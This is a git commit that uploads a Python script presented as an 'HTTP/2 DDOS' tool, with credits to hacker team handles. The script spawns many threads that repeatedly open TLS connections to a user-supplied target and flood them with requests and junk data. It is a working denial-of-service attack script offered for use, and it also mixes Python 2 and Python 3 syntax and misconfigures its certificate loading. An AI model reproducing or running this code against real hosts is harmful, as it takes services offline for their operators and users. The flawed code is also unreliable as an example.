9f1654e38058e23e8b3d7cb396d592865c65ab00
YTTA YANG TAHU TAHU AJA <113217515+JohanChungus@users.noreply.github.com>
2023-10-20 20:12:59 +0700

    Add files via upload

---
+++ file-wda.py
@@ -0,0 +1,74 @@
+import socket
+import ssl
+import sys
+import time
+import random
+import threading
+import os
+
+os.system("clear")
+os.system("figlet HTTP/2 DDOS")
+print "Code by: H1m404"
+print "Tool: HTTP/2 DDOS"
+print "Team: 407 Authentic Exploit"
+print "thanks to: H1m404 - MR.L0V3R - Mr.W4hyu"
+print "Greets to: Mr.TenWap - Mr.TamfanX Cyber Team"
+print "Spesial Thanks to: 2Easy4Hack Team"
+print "Contact me: https://fb.me/n00b.me"
+print "-------------------------------------------------"
+print " "
+
+if len(sys.argv) < 4:
+    print "Usage: " + sys.argv[0] + " <target> <port> <threads>"
+    sys.exit()
+
+target = sys.argv[1]
+port = int(sys.argv[2])
+threads = int(sys.argv[3])
+
+request = str("GET / HTTP/1.1\r\n" +
+              "Host: " + target + "\r\n" +
+              "Connection: keep-alive\r\n" +
+              "Pragma: no-cache\r\n" +
+              "Cache-Control: no-cache\r\n" +
+              "Upgrade-Insecure-Requests: 1\r\n" +
+              "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\r\n" +
+              "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
+              "DNT: 1\r\n" +
+              "Accept-Encoding: gzip, deflate, sdch\r\n" +
+              "Accept-Language: en-US,en;q=0.8\r\n" +
+              "Accept-Charset: UTF-8\r\n" +
+              "\r\n")
+
+ctx = ssl.create_default_context()
+ctx.set_alpn_protocols(['h2', 'http/1.1'])
+ctx.load_cert_chain(certfile="localhost-privkey.pem", keyfile="localhost-privkey.pem")
+
+class WorkerThread(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+
+    def run(self):
+        while True:
+            try:
+                s = ctx.wrap_socket(socket.socket(socket.AF_INET), server_hostname=target)
+                s.connect((target, port))
+                s.send(request.encode())
+                for i in range(3000):
+                    s.send(str(i).encode() * 1000)
+                    print("Thread sent:", i)
+                s.close()
+            except:
+                pass
+
+for i in range(threads):
+    WorkerThread().start()
+    print("Thread " + str(i + 1) + " created!")
+
+print("Attacking the target now...")
+
+time.sleep(1)
+
+input("Press any key to stop the attack...")
+
+sys.exit(0)
